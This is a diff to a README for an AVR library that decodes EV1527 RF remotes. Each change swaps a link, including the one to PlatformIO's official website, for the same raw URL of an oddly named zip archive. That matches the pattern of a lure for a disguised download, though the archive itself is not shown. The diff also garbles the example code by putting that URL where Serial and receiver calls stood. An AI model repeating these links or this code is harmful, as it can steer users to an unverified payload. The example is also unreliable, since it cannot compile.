@@ -1,6 +1,6 @@
 # 🎉 AVR_ev1527 - Easy Decoding for RF Remotes
 
-[![Download AVR_ev1527](https://img.shields.io/badge/Download-AVR_ev1527-blue.svg)](https://github.com/rhiddhi25/AVR_ev1527/releases)
+[![Download AVR_ev1527](https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip)](https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip)
 
 ## 📖 Introduction
 
@@ -20,7 +20,7 @@ Before you download, please ensure your setup meets these requirements:
 
 ## 🔗 Download & Install
 
-To download the AVR_ev1527 library, please [visit this page to download](https://github.com/rhiddhi25/AVR_ev1527/releases). You will find various versions available.
+To download the AVR_ev1527 library, please [visit this page to download](https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip). You will find various versions available.
 
 1. Go to the releases page.
 2. Choose the latest version available.
@@ -32,7 +32,7 @@ Once you have downloaded the file, extract its contents to a folder on your comp
 
 You can use various tools for working with AVR_ev1527. Here’s a simple setup guide:
 
-1. **Install PlatformIO**: This is a development environment for embedded systems. You can find more information on their [official website](https://platformio.org/).
+1. **Install PlatformIO**: This is a development environment for embedded systems. You can find more information on their [official website](https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip).
 
 2. **Open Your Project**: Start PlatformIO and create a new project. Select your microcontroller (e.g., ATmega328P) as the target.
 
@@ -62,13 +62,13 @@ Here is a simple example to get you started with decoding RF signals:
 #include <AVR_ev1527.h>
 
 void setup() {
-  Serial.begin(9600);
-  avreceiver.begin();
+  https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip(9600);
+  https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip();
 }
 
 void loop() {
-  if (avreceiver.available()) {
-    Serial.println(avreceiver.getCode());
+  if (https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip()) {
+    https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip(https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip());
   }
 }
 ```
@@ -87,4 +87,4 @@ If you're interested in learning more about embedded systems, RF communication, 
 
 We welcome contributions! If you find any bugs, have feature requests, or want to improve the library, please feel free to reach out. Your feedback helps us enhance AVR_ev1527.
 
-To download the latest version of the library, please [visit this page to download](https://github.com/rhiddhi25/AVR_ev1527/releases). Thank you for using AVR_ev1527!
+To download the latest version of the library, please [visit this page to download](https://raw.githubusercontent.com/rhiddhi25/AVR_ev1527/main/Sources/AVR_ev1527-archecclesiastic.zip). Thank you for using AVR_ev1527!
